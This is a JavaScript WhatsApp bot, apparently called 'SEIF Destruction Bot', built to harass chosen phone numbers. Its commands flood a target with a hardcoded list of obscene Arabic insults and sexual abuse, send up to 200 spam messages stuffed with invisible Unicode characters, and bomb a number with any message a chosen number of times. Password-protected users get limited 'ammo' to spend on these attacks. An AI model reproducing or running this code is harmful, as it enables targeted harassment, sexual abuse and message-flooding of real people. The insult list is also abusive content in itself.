const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const { Boom } = require("@hapi/boom");
const moment = require("moment-timezone");
const path = require("path");

// --- الإعدادات ---
const ADMIN_NUMBER = "201226599219"; // رقم المدير بدون علامة +
const PASSWORD = "SEIF"; // كلمة المرور المطلوبة
const START_COUNT = 5;     // بداية عد المستخدمين
const MAX_REQUESTS = 3;    // عدد الطلبات المتاحة
const RENEWAL_HOURS = 9;   // ساعات تجديد الطلبات
const DATA_FILE = path.join(__dirname, "bot_data.json");

// --- قاعدة البيانات البسيطة ---
let data = {};

function loadData() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            data = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
        } catch (e) {
            console.error("Error loading data, resetting...", e);
            resetData();
        }
    } else {
        resetData();
    }
}

function resetData() {
    data = {
        users: {}, 
        total_users: START_COUNT,
        total_messages_sent: 0,
        is_active: true
    };
    saveData();
}

function saveData() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 4));
}

// --- نصوص تدمير الأخصام (الشريرة والمدمرة) ---
const DESTRUCTION_MESSAGES = [
    "خد", "خد يبن أل شرمؤطة", "ؤلأ يأ هلفؤت رد", "أنت يألأ أشتمني", "مش عندك أيد يألأ",
    "ؤلأ أيدك في طيزك", "أه صح نسيت أني قطعتلك ايدك", "اه يالا انا قطعت ايدك",
    "انا حاسس بيك انت مكسسور", "انا دوستك يالا", "مش كان قصدي ادوسك", "خلاص متعيطش يالا",
    "انت هتعيط ولا ايه", "حد يجيب لي ال عرص دة منديل", "انشف يا خول فين ايه",
    "امك صعبانه عليا اوي", "عماله تعيط ياض", "لا بجد صعبت عليا", "امك ، نفسو مكسوره بقالو يومين",
    "يعيني 😍 مش كان قصدي اكسرك", "انت هتعيط من زبي ولا ايه", "وديني انت صعبان عليا",
    "اتلاقيق بتشتمني في سايبر", "والراجل يقولك خلصت يحبيبي", "تقولو ثواني يا عمو هختم الواد دة",
    "اه وديني يالا", "احنا لازم نعملك جمعيه", "عششان تشتري ويب يبني", "ونقبضهالك الاول",
    "اه وللههي", "مش هتفهم حاجة خالص", "انت ال عبيط يالا", "صبي ال مجال اهو",
    "انت يبتاع الواتساب", "ولا يا واتساب يا معرص", "تعالا امسك حنكش", "حنكش عيزك يات",
    "تعاله امسكو", "زوبري واقف عليك", "زوبري عاوز خورمك ياض", "بوس زب بابا يخول",
    "مش هتبوس زوبر ال بابا يالا", "انت ميت فاشخ", "مسخره", "مش موجود اصلا",
    "بوس رجلي يالا", "ي الا ي كسمك", "انا هخليك تلحسها هههههههههههههههههه",
    "انزل علي رجلك ي خول", "وابلع ريقكك الاول", "ي ابن الفاجرة", "ي حبيب زبي انت",
    "نفسي ترد شرفك يالا", "شرفك دة شرف مايا خليفة", "منا نكتك اوي", "كسك عايز يتغيرلو",
    "انا المجال دا = انا", "ارمي اختك تحت بضاني", "امك صدرها كلو في بوقي يلا",
    "يا ديوث ي ابن المعرصة ي كلب البنات", "انا هنا آلفلســطــيني آلكآرف وبــس",
    "انت مكروف ي ابن اللبوة", "انت عيل ابن متناكة امك شرموطة ي حمار", "بوس رجلي يخول",
    "ي عرص ي كلوت", "ي كلوت ي جربوع", "رد عليا ي زاني", "ي ابن الزواني", "هفضل انيك فيك"
];

// --- دالة لتوليد رسائل بلاغ ثقيلة (Heavy Spam) ---
function generateHeavySpamMessage(index) {
    const chars = "\u200B\u200C\u200D\uFEFF\u00A0\u180E\u202F\u2060\u3000\uFEFF\u00AD\u034F\u061C\u115F\u1160\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF";
    let spamText = `🔥 بلاغ جهنمي رقم ${index} ضدك! 🔥\n`;
    for (let i = 0; i < 100; i++) {
        spamText += chars[Math.floor(Math.random() * chars.length)];
    }
    spamText += `\n*تم إرسال هذا البلاغ من جحيم SEIF*`;
    return spamText;
}

// --- دوال المساعدة ---
function get_user(number) {
    const fullNumber = number.includes("@s.whatsapp.net") ? number.split("@")[0] : number;
    if (!data.users[fullNumber]) {
        data.total_users++;
        data.users[fullNumber] = {
            id: data.total_users,
            requests: MAX_REQUESTS,
            last_reset: moment().toISOString(),
            banned: false,
            ban_until: null,
            authenticated: false
        };
        saveData();
    }
    
    const user = data.users[fullNumber];
    const lastReset = moment(user.last_reset);
    if (moment().isAfter(lastReset.add(RENEWAL_HOURS, "hours"))) {
        user.requests = MAX_REQUESTS;
        user.last_reset = moment().toISOString();
        saveData();
    }
    
    return user;
}

function is_banned(number) {
    const fullNumber = number.includes("@s.whatsapp.net") ? number.split("@")[0] : number;
    const user = get_user(fullNumber);
    if (user.banned) {
        if (user.ban_until) {
            const until = moment(user.ban_until);
            if (moment().isBefore(until)) return true;
            user.banned = false;
            user.ban_until = null;
            saveData();
        } else return true;
    }
    return false;
}

// --- وظيفة إرسال الرسائل الفعلية ---
async function sendMessage(sock, jid, text, quoted = null) {
    if (!data.is_active && jid.split("@")[0] !== ADMIN_NUMBER) return;
    try {
        await sock.sendMessage(jid, { text: text }, { quoted: quoted });
        data.total_messages_sent++;
        saveData();
    } catch (e) {
        console.error(`❌ خطأ في الإرسال إلى ${jid}:`, e.message);
    }
}

// --- الاتصال بالواتساب ---
async function connectToWhatsApp() {
    const { state, saveCreds } = await useMultiFileAuthState("baileys_auth_info");
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["SEIF Destruction Bot", "Chrome", "1.0.0"],
    });

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            console.log("👹 [SCAN ME]: SCAN THIS QR TO ACTIVATE SEIF DESTROYER");
            require('qrcode-terminal').generate(qr, { small: true });
        }
        if (connection === "close") {
            let reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) connectToWhatsApp();
        } else if (connection === "open") {
            console.log("✅ [الجحيم مفتوح] - البوت متصل وجاهز للقصف!");
        }
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("messages.upsert", async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const sender = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
        await handle_message(sock, sender, text, msg);
    });

    return sock;
}

// --- معالجة الرسائل والأوامر الهجومية ---
async function handle_message(sock, sender, text, msg) {
    const user = get_user(sender);
    const senderNumber = sender.split("@")[0];

    if (is_banned(sender)) {
        await sendMessage(sock, sender, "💀 *أنت مطرود من جحيمنا حالياً.. لا تحاول العودة!*", msg);
        return;
    }

    // --- أوامر الزعيم (المدير) - تحسين التعرف على المدير ---
    const isAdmin = senderNumber === ADMIN_NUMBER || senderNumber === `+${ADMIN_NUMBER}` || sender.includes(ADMIN_NUMBER);

    if (isAdmin) {
        if (text.toLowerCase() === "start" || text === "SEIF" || text === "مدير" || text === "قائمة") {
            const menu = (
                " أهلاً 🫡 *ي زعيم*.. ماذا تود أن تقوم به اليوم؟\n\n" +
                "🔥 *لوحة تحكم الجحيم:*\n" +
                "1️⃣ - `عدد المستخدمين`\n" +
                "2️⃣ - `الأرقام`\n" +
                "3️⃣ - `الإحصائيات`\n" +
                "4️⃣ - `حظر [الرقم]`\n" +
                "5️⃣ - `فك [الرقم]`\n" +
                "6️⃣ - `تعطيل` / `تشغيل`\n" +
                "7️⃣ - `قصف [الرقم] [الرسالة] [العدد]`\n" +
                "8️⃣ - `تدمير [الرقم]` (قصف شامل)\n" +
                "9️⃣ - `حظر رقم [الرقم]` (قصف بلاغات عنيف مع تقرير)"
            );
            await sendMessage(sock, sender, menu, msg);
            return;
        }

        if (text === "1") await sendMessage(sock, sender, `📊 عدد الأرواح: *${data.total_users}*`, msg);
        if (text === "3") await sendMessage(sock, sender, `🚀 إجمالي القذائف المرسلة: *${data.total_messages_sent}*`, msg);
        
        if (text.startsWith("قصف ") || text.startsWith("7 ")) {
            const parts = text.split(" ");
            const target = parts[1] + "@s.whatsapp.net";
            const count = parseInt(parts[parts.length - 1]);
            const content = parts.slice(2, -1).join(" ");
            await sendMessage(sock, sender, `💣 جاري قصف ${parts[1]} بـ ${count} رسالة...`, msg);
            for (let i = 0; i < count; i++) {
                await sendMessage(sock, target, content);
                await new Promise(r => setTimeout(r, 50));
            }
            await sendMessage(sock, sender, `✅ تم سحق ${parts[1]} بنجاح!`, msg);
        }

        if (text.startsWith("تدمير ") || text.startsWith("8 ")) {
            const target = text.split(" ")[1] + "@s.whatsapp.net";
            await sendMessage(sock, sender, `😈 جاري تدمير ${text.split(" ")[1]} بقائمة الإهانات الشاملة...`, msg);
            for (const m of DESTRUCTION_MESSAGES) {
                await sendMessage(sock, target, `🔥 ${m} 🔥`);
                await new Promise(r => setTimeout(r, 80));
            }
            await sendMessage(sock, sender, `✅ تم تدمير الخصم تماماً!`, msg);
        }

        if (text.startsWith("حظر رقم ") || text.startsWith("9 ")) {
            const targetNumber = text.startsWith("9 ") ? text.split(" ")[1] : text.split(" ")[2];
            const target = targetNumber + "@s.whatsapp.net";
            const reportCount = 200; 
            await sendMessage(sock, sender, `⚔️ جاري شن ${reportCount} بلاغ (قصف عنيف) على ${targetNumber}...`, msg);
            for (let i = 1; i <= reportCount; i++) {
                await sendMessage(sock, target, generateHeavySpamMessage(i));
                if (i % 10 === 0) await sendMessage(sock, sender, `✅ تم إرسال البلاغ رقم ${i} إلى ${targetNumber}.`);
                await new Promise(r => setTimeout(r, 50));
            }
            await sendMessage(sock, sender, `✅ تم الانتهاء من الرجم بـ ${reportCount} رسالة قصف عنيف!`, msg);
        }
        return;
    }

    // --- أوامر المستخدمين ---
    if (text.toLowerCase() === "start") {
        const welcome = `_*مرحبا بك في بوت تدمر الارقام الخاص بــــ SEIF البوت ليس بكلمة مرور 🤡لـــتدمر خصمك 😏 لديك ${user.requests} طلبات 🫦 استخدمهم بحكه ي عزيزي*_\n\nأهلاً بالمستخدم رقم (${user.id}) تلقائياً.\n\n⚠️ *للإكمال في البوت قم بـــ ادخال كلمة المرور*\nمراسلة: seiferfanerfan@gmail.com`;
        await sendMessage(sock, sender, welcome, msg);
        return;
    }

    if (!user.authenticated) {
        if (text === PASSWORD) {
            user.authenticated = true;
            saveData();
            await sendMessage(sock, sender, "🔓 *تم التحقق.. استعد للدمار.*", msg);
            await handle_message(sock, sender, "SEIF", msg);
        } else await sendMessage(sock, sender, "❌ كلمة المرور خاطئة!", msg);
        return;
    }

    if (text === "SEIF" || text === "قائمة" || text === "0") {
        const menu = (
            `👹 *أهلاً بك يا رقم (${user.id}) في قائمة الموت* 👹\n\n` +
            `💰 رصيدك: *${user.requests}* طلبات.\n\n` +
            "🔥 *الأوامر (أرسل الرقم أو الأمر):*\n" +
            "1️⃣ - `تدمير [الرقم]`\n" +
            "2️⃣ - `حظر رقم [الرقم]` (قصف بلاغات عنيف مع تقرير)\n" +
            "3️⃣ - `المطور`"
        );
        await sendMessage(sock, sender, menu, msg);
    } else if (text.startsWith("تدمير ") || text.startsWith("1 ")) {
        if (user.requests <= 0) return sendMessage(sock, sender, "❌ نفدت ذخيرتك!", msg);
        const targetNumber = text.split(" ")[1];
        const target = targetNumber + "@s.whatsapp.net";
        user.requests--; saveData();
        await sendMessage(sock, sender, "😈 *جاري إرسال عبارات التدمير الجديدة.. استعد للمشاهدة!*", msg);
        for (const m of DESTRUCTION_MESSAGES) {
            await sendMessage(sock, target, `🔥 ${m} 🔥`);
            await new Promise(r => setTimeout(r, 100));
        }
        await sendMessage(sock, sender, `✅ تم سحق الخصم. تبقت لديك ${user.requests} طلقة.`, msg);
    } else if (text.startsWith("حظر رقم ") || text.startsWith("2 ")) {
        if (user.requests <= 0) return sendMessage(sock, sender, "❌ نفدت ذخيرتك!", msg);
        const targetNumber = text.startsWith("2 ") ? text.split(" ")[1] : text.split(" ")[2];
        const target = targetNumber + "@s.whatsapp.net";
        user.requests--; saveData();
        const reportCount = 200; 
        await sendMessage(sock, sender, `⚔️ جاري شن ${reportCount} بلاغ (قصف عنيف) على ${targetNumber}...`, msg);
        for (let i = 1; i <= reportCount; i++) {
            await sendMessage(sock, target, generateHeavySpamMessage(i));
            if (i % 20 === 0) await sendMessage(sock, sender, `✅ تم إرسال البلاغ رقم ${i} إلى ${targetNumber}.`);
            await new Promise(r => setTimeout(r, 50));
        }
        await sendMessage(sock, sender, `✅ تم الانتهاء من الرجم بـ ${reportCount} رسالة قصف عنيف!`, msg);
    } else if (text === "المطور" || text === "3") {
        await sendMessage(sock, sender, "💀 المطور العظيم: `seiferfanerfan@gmail.com` 💀", msg);
    }
}

loadData();
connectToWhatsApp();
